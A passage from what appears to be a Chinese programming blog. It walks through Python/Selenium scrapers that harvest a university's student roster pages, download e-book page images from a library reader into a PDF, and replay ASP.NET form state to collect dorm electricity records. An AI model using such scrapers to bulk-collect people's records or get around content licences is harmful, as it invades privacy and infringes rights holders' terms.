class="comment"># login success</span></span><br><span class="line"><span class="comment"># y</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_yan.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b</span></span><br><span class="line">option = driver.find_element_by_xpath(<span class="string">'//select/option[@value="serieN10B"]'</span>)</span><br><span class="line">option.click()</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_ben.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br></pre></td></tr></table></figure>
<p>Happy hacking~</p>
<p><img src="/images/spider/yingxin6.png" alt=""></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/04/chaoxing/" itemprop="url">
                  Python Spider: 超星图书爬取转换
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-04T00:00:00+08:00" content="2015-04-04">
              2015-04-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/04/chaoxing/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/04/chaoxing/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="超星数字图书馆(北邮镜像):_在线阅读书籍爬取转换(selenium)">超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</h2><blockquote>
<p>我忧心忡忡地看待未来，但仍满怀美好的希望。</p>
<p>—— Albert Schweitzer</p>
</blockquote>
<p>这次推荐selenium，自从有了selenium，爬虫从来没有这么简单过。</p>
<hr>
<p>几天前，一个工作的同学想让我帮他借一本书《聚酰亚胺新型材料》，他工作上需要看这本书的一些内容，但是这本书已经绝版，网上也没有出售。</p>
<p>于是我帮他搜索了下，图书馆里没有这本书。忽然想起来我邮还买了很多电子资源。</p>
<p>于是从图书馆主页选择<code>电子图书</code>-&gt;<code>超星数字电子图书数据</code>，进入如下页面。</p>
<p><img src="/images/spider/chaoxing.png" alt=""></p>
<p>搜索了下这本书，找到了一本。</p>
<p><img src="/images/spider/chaoxing1.png" alt=""></p>
<p>太棒了，下载下来……额……下载需要阅读器……</p>
<p><img src="/images/spider/chaoxing2.png" alt=""></p>
<p>对一个伪geek最讨厌的事情之一就是，某个牛比的企业倚杖其资源绑架用户安装所谓的客户端。比如讨厌的腾讯和讨厌的淘宝。</p>
<p>自然也不会下载什么阅读器，但是，既然可以在线看，那么就可以下载下来。实在在不行我浏览器截图行么。</p>
<p>selenium让一切成为可能(包括截图)。</p>
<p>让我们在线阅读：</p>
<p><img src="/images/spider/chaoxing3.png" alt=""></p>
<p>在线阅读提供了一些功能，包括索引、目录和文字提取，悲剧的是下载下来之后转成的pdf可没有这么多道道。虽然，如果肯花时间解决这些都不是问题……但是，我们又不是想pirate电子书……</p>
<p>对页面按右键发现这是个图片！接着观察对应的源码发现，是一个input标签，仔细观察这个input标签你可以看到很多属性，比如比较重要的class、scr、src、jpgname。</p>
<p>仔细多观察一个，你会发现，class是Jimg的似乎都是书页内容、jpgname属性是页码、scr和src好像都是书页图片地址。</p>
<p><img src="/images/spider/chaoxing4.png" alt=""></p>
<p>你可以试试。说服自己那些就是书页图片地址</p>
<p><img src="/images/spider/chaoxing6.png" alt=""></p>
<p>多看几个发现下面的页面其实src属性都是假的，猜测是书页滚动到某个页面，通过js动态修改src来实现实时加载而不是一下全加载。</p>
<p><img src="/images/spider/chaoxing5.png" alt=""></p>
<p>那么，我们抓取当前网页阅读页面所有class属性是<code>Jimg</code>的input标签的<code>scr</code>标签，就可以获取所有书页的图像了。</p>
<p>接下来，看看selenium是多么丧心病狂……</p>
<p>我们把以上所有从搜索到在线阅读的过程自动化……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> imghdr</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># bookname = u'聚酰亚胺新型材料'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bookname = unicode(sys.argv[<span class="number">1</span>], <span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[Usage:] chaoxing.py bookname"</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先搜索</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://sslibbook2.sslibrary.com'</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入书名</span></span><br><span class="line">driver.find_element_by_id(<span class="string">'sword'</span>).send_keys(bookname)</span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">"btn-jiansuo"</span>).click()</span><br><span class="line"><span class="comment"># 检索结果</span></span><br><span class="line">driver.switch_to_frame(<span class="string">'book'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(driver.find_elements_by_class_name(<span class="string">'yy'</span>)) &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 确认书名</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">0</span>].text</span><br><span class="line">       == <span class="string">u"《"</span> + bookname + <span class="string">u"》"</span>)</span><br><span class="line"><span class="comment"># 确认有网页阅读</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].text == <span class="string">u'网页阅读'</span>)</span><br><span class="line"></span><br><span class="line">bookurl = driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].get_attribute(<span class="string">'href'</span>)</span><br><span class="line"></span><br><span class="line">driver.get(bookurl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where img locate</span></span><br><span class="line">base_url = <span class="string">"http://"</span> + urllib2.urlparse.urlparse(driver.current_url).netloc</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(driver.page_source.find(<span class="string">u'超星'</span>) &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pages = driver.find_elements_by_xpath(<span class="string">'//input[@class="Jimg"]'</span>)</span><br><span class="line"></span><br><span class="line">filelist = [e.get_attribute(<span class="string">'jpgname'</span>) <span class="keyword">for</span> e <span class="keyword">in</span> pages]</span><br><span class="line"></span><br><span class="line">imglist = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> pages:</span><br><span class="line">    imglist[e.get_attribute(<span class="string">'jpgname'</span>)] = base_url + e.get_attribute(<span class="string">'scr'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> imglist.iteritems():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(k):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib.urlretrieve(v, k)</span><br><span class="line">        <span class="keyword">assert</span>(imghdr.what(k) == <span class="string">'png'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">u'convert '</span> + <span class="string">u' '</span>.join(filelist) + <span class="string">' '</span> + bookname + <span class="string">u'.pdf'</span></span><br><span class="line">cmd = cmd.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">os.popen(cmd)</span><br></pre></td></tr></table></figure>
<p>稍微解释下，最后，是用imagemagick把一大堆png格式的书页内容转化成pdf格式。这个过程相当耗内存……如果有空就想想怎么换种方式转pdf，也愿各位看官能指教下。</p>
<p><img src="/images/spider/chaoxing7.png" alt=""></p>
<p>当然，我并没有把pdf传给任何人，我看完之后跟同学讲了讲，没有做任何盗版行径。同学们也要遵守用户守则，不要乱搞。</p>
<p>让我们引以为戒 <a href="http://zh.wikipedia.org/wiki/%E4%BA%9A%E4%BC%A6%C2%B7%E6%96%AF%E6%B2%83%E8%8C%A8" target="_blank" rel="external">Aaron Swartz</a></p>
<p><img src="img=http://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Aaron_Swartz_profile.jpg/220px-Aaron_Swartz_profile.jpg" alt="Aaron Swartz"></p>
<p>非法下载书籍的罪名是非常非常严重的！！！！！</p>
<hr>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/03/ydcx/" itemprop="url">
                  Python Spider: 北邮用电查询系统数据
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-03T00:00:00+08:00" content="2015-04-03">
              2015-04-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/03/ydcx/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/03/ydcx/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="愿总有阳光照进回忆里：学生购电用电查询系统">愿总有阳光照进回忆里：学生购电用电查询系统</h2><p>感冒了，难得会被人挂念。谢谢，总有阳光照进回忆里，温暖的气息让人难以忘记。</p>
<hr>
<p>某天，一位大神师兄 @Zhaoking 神秘兮兮地给我看一个网站 <a href="http://ydcx.bupt.edu.cn/" target="_blank" rel="external">http://ydcx.bupt.edu.cn/</a></p>
<p>师兄说，你可以试着把它的数据爬下来。</p>
<p>当时开着八个线程跟着机器学习、回归分析、统计推断、探索性图形分析一堆数据分析的课程，觉得似乎把用电数据爬下来可以玩玩。<br>于是谨听师兄命令……</p>
<p><img src="/images/spider/ydcx.png" alt=""></p>
<p>首先，就是研究研究网站逻辑。打开firebug，输入1-101，回车。</p>
<p><img src="/images/spider/ydcx1.png" alt=""></p>
<p>显然，首先是一个post操作，但返回了一个302重定向，所以，第二个请求应该是正确的请求</p>
<p>试试看看</p>
<pre><code><span class="keyword">In</span> [<span class="number">1</span>]: import requests

<span class="keyword">In</span> [<span class="number">2</span>]: dorm_num = <span class="comment">'1-101'</span>

<span class="keyword">In</span> [<span class="number">3</span>]: r = requests.<span class="keyword">get</span>(<span class="comment">'http://ydcx.bupt.edu.cn/see.aspx?useid=' + dorm_num)</span>
</code></pre><p>检查下r.content，确认在里头看到了电量和加电信息。</p>
<p><img src="/images/spider/ydcx2.png" alt=""></p>
<p>那么，还有这么多页这么办？我们点点看看。页码1已经不能点了，点2。</p>
<p><img src="/images/spider/ydcx3.png" alt=""></p>
<p>竟然变成一个post了，而且post的数据这么多，你可以抱着试试看的心理不加上这些post的数据试试。</p>
<pre><code><span class="keyword">In</span> [<span class="number">5</span>]: __EVENTTARGET = <span class="string">'GridView1'</span>

<span class="keyword">In</span> [<span class="number">6</span>]: __EVENTARGUMENT = <span class="string">'Page$2'</span>

<span class="keyword">In</span> [<span class="number">7</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT}

<span class="keyword">In</span> [<span class="number">9</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">10</span>]: r
Out[<span class="number">10</span>]: &lt;Response [<span class="number">500</span>]&gt;
</code></pre><p>500——internal error……这个错误一般表示服务器内部处理出现错误。怎么回事呢，直觉告诉我们，问题就在于那些Post的参数。</p>
<p>加上试试，</p>
<pre><code> <span class="keyword">In</span> [<span class="number">15</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT, <span class="string">'__EVENTVALIDATION'</span>: <span class="string">'/wEWCwLMxp63CAKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1/Loh35D537/CRr+++EgM74nLP5E='</span>, <span class="string">'__VIEWSTATE'</span>: <span class="string">'/wEPDwULLTIwNzMwNzAxOTAPZBYCAgMPZBYQZg8PFgIeBFRleHQFATFkZAIBDw8WAh8ABQEgZGQCAg8PFgIfAAUyMS0xMDEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZAIDDw8WAh8ABQbnlLXku7dkZAIEDw8WAh8ABQwwMDAwMDAwMzg5NTVkZAIFDw8WAh8ABQ0xMC4yMTAuOTYuMjEwZGQCBg88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCjQNkFgJmD2QWFgIBD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTI0IDA6MDA6MDBkZAICDw8WAh8ABQMyMTVkZAICD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIzIDA6MDA6MDBkZAICDw8WAh8ABQMyMThkZAIDD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIyIDA6MDA6MDBkZAICDw8WAh8ABQMyMjBkZAIED2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIxIDA6MDA6MDBkZAICDw8WAh8ABQMyMjNkZAIFD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIwIDA6MDA6MDBkZAICDw8WAh8ABQMyMjVkZAIGD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE5IDA6MDA6MDBkZAICDw8WAh8ABQMyMjhk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'</span>} 

<span class="keyword">In</span> [<span class="number">16</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">17</span>]: r
Out[<span class="number">17</span>]: &lt;Response [<span class="number">200</span>]&gt;
</code></pre><p>成功的返回了需要的用电数据，你可以检查下r.content看看</p>
<p>接下来的问题在于，这些参数从哪里来的？</p>
<p>简单谷歌下和检查下网页源代码，可以看到</p>
<p><img src="/images/spider/ydcx6.png" alt=""></p>
<p>那么逻辑就清晰了，先get请求某个寝室的页面，获取对应的post参数，然后一页一页往后翻就是。</p>
<p>下面讲讲如何从html源码中提取信息，用re当然可以，但是xpath这种东西也许更好用。比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## parse the content</span></span><br><span class="line">root = fromstring(r.content)</span><br><span class="line"><span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">__VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">__EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>相比写这么个正则简单优雅很多，不过所谓quick and dirty，不管黑猫白猫……：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(<span class="string">'id="__VIEWSTATE" value="([^"]+)", r.content).group(1)</span></span><br></pre></td></tr></table></figure>
<p>接下来的问题在于，页码总数我不知道，最后的一个…符号可以进入下一个十页。</p>
<p><img src="/images/spider/ydcx4.png" alt=""></p>
<p><img src="/images/spider/ydcx5.png" alt=""></p>
<p>那么，反正最后经过trial and error以一种很quick and dirty的方式work around页码这个问题……</p>
<p>我的解决方案，一个循环，页码不断加一，并且读取当前页右下角所有显示页码。</p>
<p>如果当前页面的那些页码cpn中最后一个，比我下一个想要抓取的np页码小一，或者当前页码个数不是十个，就肯定是最后几页了，就可以抓取然后break不继续往后抓取了。</p>
<p>if (int(cpn[-1]) == np - 1) or (int(cpn[-1]) % 10 != 0):</p>
<p>反正……最后可以运行……</p>
<p><img src="/images/spider/ydcx7.png" alt=""></p>
<p>多么不堪入目的实现，随便看看玩</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 